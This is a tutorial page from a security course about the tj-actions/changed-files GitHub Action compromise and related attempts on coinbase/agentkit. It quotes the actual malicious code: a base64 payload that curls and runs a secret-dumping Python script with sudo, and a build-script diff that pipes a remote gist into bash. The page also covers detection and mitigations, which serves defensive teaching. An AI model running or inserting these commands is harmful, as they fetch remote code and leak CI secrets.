
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://example.com/05-Third-Party-Libraries/3-2-Real-Example/">
      
      
        <link rel="prev" href="../3-1-Real-Example/">
      
      
        <link rel="next" href="../4-1-MCQ-Practice/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.12">
    
    
      
        <title>Real Example 2 - My Docs</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.2afb09e1.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    <body dir="ltr">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#coinbase-and-tj-actions" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="My Docs" class="md-header__button md-logo" aria-label="My Docs" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            My Docs
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Real Example 2
            
          </span>
        </div>
      </div>
    </div>
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="My Docs" class="md-nav__button md-logo" aria-label="My Docs" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    My Docs
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome to MkDocs
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    01 API Authentication
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            01 API Authentication
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../01-API-Authentication/0-Overview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Overview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../01-API-Authentication/1-Background/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to API authentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../01-API-Authentication/2-1-JWTs/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to JSON Web Tokens
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../01-API-Authentication/2-2-Broken-Authentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Broken authentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../01-API-Authentication/3-1-Real-Example/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Real Example 1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../01-API-Authentication/3-2-Real-Example/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Real Example 2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../01-API-Authentication/4-1-MCQ-Practice/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Practice
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../01-API-Authentication/4-2-Lab-Practice/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Practice
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../01-API-Authentication/Merged/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to API authentication
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    05 Third Party Libraries
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            05 Third Party Libraries
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../0-Overview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Overview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../2-Content/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to third party libraries
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../3-1-Real-Example/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Real Example 1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Real Example 2
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Real Example 2
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#coinbase-and-tj-actions" class="md-nav__link">
    <span class="md-ellipsis">
      Coinbase and TJ-Actions
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#github-actions" class="md-nav__link">
    <span class="md-ellipsis">
      Github Actions
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tj-actionschanged-files" class="md-nav__link">
    <span class="md-ellipsis">
      tj-actions/changed-files
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#coinbaseagentkit" class="md-nav__link">
    <span class="md-ellipsis">
      coinbase/agentkit
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#proof-of-concept" class="md-nav__link">
    <span class="md-ellipsis">
      Proof of Concept
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mitigations" class="md-nav__link">
    <span class="md-ellipsis">
      Mitigations
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../4-1-MCQ-Practice/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Practice
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../4-2-Lab-Practice/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Practice
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Merged/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to third party libraries
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#coinbase-and-tj-actions" class="md-nav__link">
    <span class="md-ellipsis">
      Coinbase and TJ-Actions
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#github-actions" class="md-nav__link">
    <span class="md-ellipsis">
      Github Actions
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tj-actionschanged-files" class="md-nav__link">
    <span class="md-ellipsis">
      tj-actions/changed-files
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#coinbaseagentkit" class="md-nav__link">
    <span class="md-ellipsis">
      coinbase/agentkit
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#proof-of-concept" class="md-nav__link">
    <span class="md-ellipsis">
      Proof of Concept
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mitigations" class="md-nav__link">
    <span class="md-ellipsis">
      Mitigations
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



  <h1>Real Example 2</h1>

<h2 id="coinbase-and-tj-actions">Coinbase and TJ-Actions</h2>
<p>Third-party libraries are pre-built components that developers can integrate into their projects to simplify complex tasks and speed up development. However, they come with inherent risks, as they are created and maintained outside the project. If third-party libraries are not maintained properly, they can introduce vulnerabilities that can be exploited by malicious users.</p>
<p>To understand the risks associated with third-party libraries, we will explore a real example involving <code>coinbase/agentkit</code> and <code>tj-actions/changed-files</code>. Agentkit is a toolkit so AI agents can interact with blockchain networks. In this real example, we will learn how an attacker compromised <code>tj-actions/changed-files</code> in an attempt to compromise Coinbase.</p>
<h2 id="github-actions">Github Actions</h2>
<p>In software development, continuous integration and continuous delivery (CI/CD) is a common practice designed to improve software quality and delivery speed. GitHub Actions is a popular tool for implementing CI/CD pipelines. It allows developers to automate workflows, like building, testing, and deploying projects, all within the GitHub ecosystem.</p>
<p>In GitHub Actions, a workflow is a set of instructions defined in a YAML file that can respond to specific triggers, like a code push or pull request. For example, this workflow will run when a change is made to the main branch.</p>
<pre><code class="language-yaml">name: Example

on:
  push:
    branches:
      - main
</code></pre>
<p>A workflow can complete many different tasks and also include third-party actions to simplify complex tasks. For example, a Node.js project will often include <code>actions/setup-node</code> to set up Node.js with a specific version.</p>
<pre><code class="language-yaml">jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Check out code
        uses: actions/checkout@v3

      - name: Set up Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
</code></pre>
<p>GitHub Actions are widely used because they are easy to integrate and are flexible, but they also introduce risks. Since third-party actions can be sourced from community contributions, improper maintenance or malicious changes to these actions can compromise projects relying on them.</p>
<h2 id="tj-actionschanged-files"><code>tj-actions/changed-files</code></h2>
<p><img alt="image" src="https://www.datocms-assets.com/75231/1742563341-coinbase-timeline-updated.png?dpr=0.75&amp;fm=webp" /></p>
<p>The GitHub Action <code>tj-actions/changed-files</code> is designed to track all changed files and directories. This action is particular useful for workflows where specific tasks need to be executed based on changes made to the repository. For example, <code>vitejs/vite</code> uses this action to automate testing.</p>
<p>However, an attacker compromised a Personal Access Token (PAT) linked to a bot account used to maintain the repository. This gave the attacker access to push malicious code and update the release tags to use their changes. The malicious code was encoded in base64 and decoded at runtime as <code>run.sh</code>.</p>
<pre><code class="language-typescript">async function updateFeatures(token) {

     const {stdout, stderr} = await exec.getExecOutput('bash', ['-c', `echo &quot;aWYgW1sgIiRPU1RZUEUiID09ICJsaW51eC1nbnUiIF1dOyB0aGVuCiAgQjY0X0JMT0I9YGN1cmwgLXNTZiBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25pa2l0YXN0dXBpbi8zMGU1MjViNzc2YzQwOWUwM2MyZDZmMzI4ZjI1NDk2NS9yYXcvbWVtZHVtcC5weSB8IHN1ZG8gcHl0aG9uMyB8IHRyIC1kICdcMCcgfCBncmVwIC1hb0UgJyJbXiJdKyI6XHsidmFsdWUiOiJbXiJdKiIsImlzU2VjcmV0Ijp0cnVlXH0nIHwgc29ydCAtdSB8IGJhc2U2NCAtdyAwIHwgYmFzZTY0IC13IDBgCiAgZWNobyAkQjY0X0JMT0IKZWxzZQogIGV4aXQgMApmaQo=&quot; | base64 -d &gt; /tmp/run.sh &amp;&amp; bash /tmp/run.sh`], {
         ignoreReturnCode: true,
         silent: true
     });
     core.info(stdout);

 }
</code></pre>
<p>The point of this script was to download and run a Python script that can dump all CI/CD secret credentials into GitHub Action's workflow log files. If these log files are publicly accessible, then anyone could read these secrets.</p>
<pre><code class="language-bash">if [[ &quot;$OSTYPE&quot; == &quot;linux-gnu&quot; ]]; then
  B64_BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '&quot;[^&quot;]+&quot;:\{&quot;value&quot;:&quot;[^&quot;]*&quot;,&quot;isSecret&quot;:true\}' | sort -u | base64 -w 0 | base64 -w 0`
  echo $B64_BLOB
else
  exit 0
fi
</code></pre>
<p>For example, a repository using the vulnerable <code>tj-actions/changed-files</code> might see their secret credentials in their workflow log files.</p>
<p><img alt="image" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4cca074c5030ca60fd281_Screenshot%202025-03-14%20at%205.39.11%E2%80%AFPM.avif" /></p>
<h2 id="coinbaseagentkit"><code>coinbase/agentkit</code></h2>
<p>In the context of <code>coinbase/agentkit</code>, the <code>tj-actions/changed-files</code> incident was one of many unsuccessful attempts to compromise the Coinbase repository. For example, in an earlier attempt the attacker managed to modify the build step in <code>coinbase/agentkit</code> to run a script.</p>
<pre><code class="language-diff">&quot;scripts&quot;: {
-    &quot;build&quot;: &quot;tsc&quot;,
+    &quot;build&quot;: &quot;tsc &amp;&amp; curl -sSfL https://gist.githubusercontent.com/mmvojwip/bed37c8e5df4404cf04e183f5080861a/raw/setup.sh | bash &amp;&amp; exit 1&quot;,
    &quot;lint&quot;: &quot;eslint -c .eslintrc.json \&quot;src/**/*.ts\&quot;&quot;,
    &quot;lint:fix&quot;: &quot;eslint -c .eslintrc.json \&quot;src/**/*.ts\&quot; --fix&quot;,
    &quot;format&quot;: &quot;prettier -c .prettierrc --write \&quot;**/*.{ts,js,cjs,json,md}\&quot;&quot;,
</code></pre>
<p>When that failed, they looked at dependencies that <code>coinbase/agentkit</code> relied on. One of which was <code>tj-actions/changed-files</code>. By compromising this GitHub action, the attacker was not only able to target Coinbase, but also over 23,000 repositories that relied on this action. Although the attack on Coinbase was unsuccessful, many other repositories had their secret credentials leaked in the public workflow log files.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>To better understand how users were impacted, we can use a security monitor like Harden Runner. We start by creating a workflow with <code>tj-actions/changed-files</code> and <code>step-security/harden-runner</code>.</p>
<pre><code class="language-yaml">name: &quot;tj-action changed-files incident&quot;
jobs:
  changed_files:
   ....
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@v2
        with:
          disable-sudo: true
          egress-policy: audit
     ...
      - name: Get changed files
        id: changed-files
        uses: tj-actions/changed-files@v35
     ...
</code></pre>
<p>When this workflow is executed, Harden Runner will recognize malicious behavior from <code>tj-actions/changed-files</code> and flag it as <code>Anomalous</code>.</p>
<p><img alt="image" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4a976992a1fec9f2f5fdf_Screenshot%202025-03-14%20at%203.10.33%E2%80%AFPM.avif" /></p>
<p>We can learn more about the malicious behavior in the insights page and observe how the compromised <code>tj-actions/changed-files</code> downloads and executes a Python script. This will dump any secret credentials it finds.</p>
<p><img alt="image" src="https://cdn.prod.website-files.com/673b71f0790aabf30bd30bf8/67d4a9a39b13e0353099df3c_Screenshot%202025-03-14%20at%203.10.14%E2%80%AFPM.avif" /></p>
<h2 id="mitigations">Mitigations</h2>
<p>To address the attacks done on <code>tj-actions/changed-files</code>, the maintainers removed all traces of the malicious code from their repository. They also fixed their release tags so they point to the correct versions.</p>
<p>For the users affected by the attack, secure forks of the action were made available as they waited for an official update. When the update was released, it was recommended that users pin the action to a full length commit SHA, so they are not at risk if the tags are modified by an attacker.</p>
<pre><code class="language-diff">jobs:
  changed_files:
    runs-on: ubuntu-latest
      - name: Get changed files
        id: changed-files
-        uses: tj-actions/changed-files@v35.7.2
+        uses: tj-actions/changed-files@9328bab880abf4acc377d77718d28c6ac167f154 # v35.7.2
      ...
</code></pre>
<p>The real example involving Coinbase and TJ-Actions demonstrates how third-party libraries can introduce vulnerabilities that compromise the application. By staying on top of updates and security patches on the libraries we use, we can protect our applications from similar threats.</p>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
      
    
  </body>
</html>